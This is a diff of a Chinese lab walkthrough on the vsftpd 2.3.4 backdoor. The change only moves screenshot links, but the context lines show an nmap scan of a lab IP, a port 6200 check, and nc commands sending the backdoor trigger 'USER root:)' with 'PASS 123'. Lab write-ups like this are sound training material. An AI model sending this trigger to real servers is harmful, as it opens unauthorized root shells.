@@ -62,8 +62,8 @@ nmap -Pn -sV -p 21 192.168.225.130
 ```
 
 扫描结果显示：**vsftpd 2.3.4**，确认存在漏洞。
+<img width="372" height="371" alt="屏幕截图 2026-10-30 201942" src="https://github.com/user-attachments/assets/c43d3715-8027-41a2-9e79-d3d6d98a4bc8" />
 
-<img width="223" height="79" alt="屏幕截图 2026-10-30 202647" src="https://github.com/user-attachments/assets/bf649358-6722-4e60-87ff-1a1b249ef49c" />
 
 ### 步骤 3：初始状态 6200 端口检测
 
@@ -93,7 +93,7 @@ nc 192.168.225.130 21
 USER root:)
 PASS 123
 ```
-
+<img width="223" height="79" alt="屏幕截图 2026-10-30 202647" src="https://github.com/user-attachments/assets/bf649358-6722-4e60-87ff-1a1b249ef49c" />
 > 
 > 关键点：用户名末尾必须带 `:)`，无空格
 
